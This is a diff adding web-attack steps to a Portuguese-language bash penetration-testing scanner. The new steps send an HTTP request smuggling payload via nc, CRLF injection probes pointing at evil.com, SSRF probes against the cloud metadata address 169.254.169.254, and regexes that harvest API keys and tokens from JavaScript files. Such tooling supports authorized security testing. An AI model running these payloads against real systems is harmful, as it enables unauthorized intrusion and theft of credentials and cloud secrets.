@@ -1556,6 +1556,114 @@ if [ "$WEB_ATIVO" = "1" ] && verificar_conexao "$ALVO"; then
   echo "==============================="
 fi
 
+# ===== PASSO 22.8: GRAPHQL INTROSPECTION =====
+progresso "GraphQL - Introspection query" 2
+if [ "$WEB_ATIVO" = "1" ]; then
+  echo ""
+  echo "=== GraphQL Introspection ==="
+  INTRO_QUERY='{"query":"query { __schema { types { name kind description fields { name } } } }"}'
+  for gql_endpoint in "/graphql" "/graphiql" "/v1/graphql" "/v2/graphql" "/api/graphql" "/gql" "/query" "/graph" "/explorer"; do
+    gql_resp=$(curl_rapido -X POST -H "Content-Type: application/json" -d "$INTRO_QUERY" --max-time 5 "$ALVO$gql_endpoint" 2>/dev/null)
+    if echo "$gql_resp" | grep -qi '"types"\|__schema\|__typename'; then
+      critico "GRAPHQL INTROSPECTION ATIVO em $gql_endpoint!"
+      echo "$gql_resp" | grep -oP '"name":"[^"]*"' | head -20
+    fi
+  done
+  echo "==============================="
+fi
+
+# ===== PASSO 22.9: HTTP REQUEST SMUGGLING =====
+progresso "HTTP Smuggling - CL.TE / TE.CL" 2
+if [ "$WEB_ATIVO" = "1" ] && command -v nc &>/dev/null; then
+  echo ""
+  echo "=== Request Smuggling ==="
+  for port in 80 443 8080 8443; do
+    echo "  Testando porta $port..."
+    # CL.TE: Content-Length + Transfer-Encoding chunked simultaneos
+    smuggling_clte=$(echo -e "POST / HTTP/1.1\r\nHost: $DOMINIO\r\nContent-Length: 44\r\nTransfer-Encoding: chunked\r\nConnection: keep-alive\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: $DOMINIO\r\n\r\n" | timeout 5 nc "$ALVO_IP" "$port" 2>/dev/null)
+    echo "$smuggling_clte" | grep -qi "admin\|200\|HTTP" && aviso "POSSIVEL SMUGGLING (CL.TE) na porta $port"
+  done
+  echo "==============================="
+fi
+
+# ===== PASSO 22.10: JS SECRETS SCANNING =====
+progresso "JS Secrets - Regex em arquivos JS" 2
+if [ "$WEB_ATIVO" = "1" ]; then
+  echo ""
+  echo "=== JS Secrets ==="
+  # Baixa a pagina, extrai links .js, baixa cada um e procura secrets
+  JS_PAGE=$(curl_rapido -L --max-time 10 "$ALVO" 2>/dev/null)
+  JS_URLS=$(echo "$JS_PAGE" | grep -oP 'src="[^"]*\.js[^"]*"' | sed 's/src="//;s/"//' | head -15)
+  for js in $JS_URLS; do
+    js_url="$js"
+    echo "$js" | grep -q "^http" || js_url="${PROTOCOLO}://${DOMINIO}/${js}" 2>/dev/null
+    JS_CONTENT=$(curl_rapido -L --max-time 10 "$js_url" 2>/dev/null)
+    [ -z "$JS_CONTENT" ] && continue
+    # Procura por secrets
+    for pat in 'api[Kk]ey' 'api_key' 'secret' 'sk_live_' 'sk_test_' 'ghp_' 'gho_' 'AKIA' '-----BEGIN' 'token' 'password' 'aws_access_key' 'AWS_SECRET' 'firebase' 'mongo' 'postgres' 'mysql://' 'redis://'; do
+      found=$(echo "$JS_CONTENT" | grep -oiP ".{0,30}$pat.{0,30}" | head -10)
+      [ -n "$found" ] && echo "$found" | while read -r line; do
+        aviso "SECRET em $js_url: ...$line..."
+      done
+    done
+  done
+  echo "==============================="
+fi
+
+# ===== PASSO 22.11: GOWITNESS - SCREENSHOT =====
+progresso "GoWitness - Screenshot do alvo" 2
+if [ "$WEB_ATIVO" = "1" ] && command -v gowitness &>/dev/null; then
+  mkdir -p "$REPORT_DIR/screenshots" 2>/dev/null
+  gowitness scan single --url "$ALVO" --screenshot-path "$REPORT_DIR/screenshots/" 2>/dev/null || aviso "gowitness falhou"
+  ls "$REPORT_DIR/screenshots/"*.* 2>/dev/null | head -1 | while read f; do info "Screenshot: $f"; done
+fi
+
+# ===== PASSO 22.12: CRLF INJECTION =====
+progresso "CRLF Injection - Quebra de resposta" 2
+if [ "$WEB_ATIVO" = "1" ]; then
+  echo ""
+  echo "=== CRLF Injection ==="
+  for param in "redirect" "url" "next" "return" "redir" "page" "file" "load" "path" "dest"; do
+    CRLF_CODE=$(curl_rapido -o /dev/null -w "%{http_code}" --max-time 5 "${ALVO}?${param}=http://evil.com%0d%0aX-Injected:%20true" 2>/dev/null)
+    CRLF_HEADER=$(curl_rapido -I --max-time 5 "${ALVO}?${param}=http://evil.com%0d%0aX-Injected:%20true" 2>/dev/null)
+    echo "$CRLF_HEADER" | grep -qi "X-Injected" && critico "CRLF INJECTION: ${param}=...%0d%0aX-Injected: true"
+  done
+  echo "==============================="
+fi
+
+# ===== PASSO 22.13: SSRF BASICO =====
+progresso "SSRF - Testando acesso interno" 2
+if [ "$WEB_ATIVO" = "1" ]; then
+  echo ""
+  echo "=== SSRF Check ==="
+  for param in "url" "file" "load" "read" "path" "src" "href" "page" "redirect" "image" "img" "download" "fetch" "proxy" "host"; do
+    resp=$(curl_rapido -L --max-time 5 "${ALVO}?${param}=http://169.254.169.254/latest/meta-data/" 2>/dev/null)
+    echo "$resp" | grep -qi "instance-id\|ami-id\|iam\|role" && critico "SSRF DETECTADO: ${param}=http://169.254.169.254/latest/meta-data/ retornou dados!"
+    resp=$(curl_rapido -L --max-time 5 "${ALVO}?${param}=http://127.0.0.1:22" 2>/dev/null)
+    echo "$resp" | grep -qi "SSH\|OpenSSH\|refused\|banner" && aviso "POSSIVEL SSRF: ${param}=http://127.0.0.1:22"
+  done
+  echo "==============================="
+fi
+
+# ===== PASSO 22.14: WEBSOCKET DISCOVERY =====
+progresso "WebSocket - Descobrindo endpoints" 2
+if [ "$WEB_ATIVO" = "1" ]; then
+  echo ""
+  echo "=== WebSocket Discovery ==="
+  WS_PORT="${PORTA:-80}"
+  for ws_endpoint in "/ws" "/wss" "/socket.io" "/websocket" "/ws/v1" "/ws/chat" "/notifications" "/realtime" "/stream" "/ws/socket"; do
+    for proto_ws in "ws" "wss"; do
+      ws_url="${proto_ws}://${DOMINIO}${ws_endpoint}"
+      ws_host=$(echo "$DOMINIO" | cut -d: -f1)
+      timeout 2 bash -c "echo > /dev/tcp/$ws_host/$WS_PORT" 2>/dev/null && {
+        aviso "Possivel WebSocket: $ws_url"
+        break
+      } || true
+    done
+  done
+  echo "==============================="
+fi
+
 # ===== PASSO 23: METASPLOIT - SCANNERS AUXILIARES =====
 progresso "Metasploit - Rodando scanners auxiliares" 2
 if valida_ferramenta "msfconsole"; then
